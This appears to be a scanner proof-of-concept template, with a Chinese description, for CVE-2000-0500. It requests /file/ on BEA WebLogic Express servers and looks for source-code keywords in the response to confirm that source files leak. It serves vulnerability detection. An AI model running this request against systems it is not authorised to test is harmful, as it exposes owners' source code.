[info]
author = "ave"
description = "验证 BEA WebLogic Express 3.1.8/4/5 源代码泄露漏洞，通过请求 /file/ 路径访问源代码文件"
id = "POC-AVE-2000-0419"
name = "CVE-2000-0500 PoC"
severity = "medium"
tags = ["ave-2000-0419"]
vuln_id = [
    "CVE-2000-0500",
    "AVE-2000-0419",
]

[poc]
logic = "all"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/file/"
protocol = "http"

[poc.requests.body]
content = ""
type = "raw"

[poc.requests.headers]
User-Agent = "AVE/1.0"

[[poc.requests.matchers]]
condition = "or"
expect = true
part = "body"
type = "word"
words = [
    "import",
    "package",
    "class",
    "public",
    "private",
    "protected",
    "void",
    "static",
    "function",
    "def",
    "var",
    "let",
    "const",
]
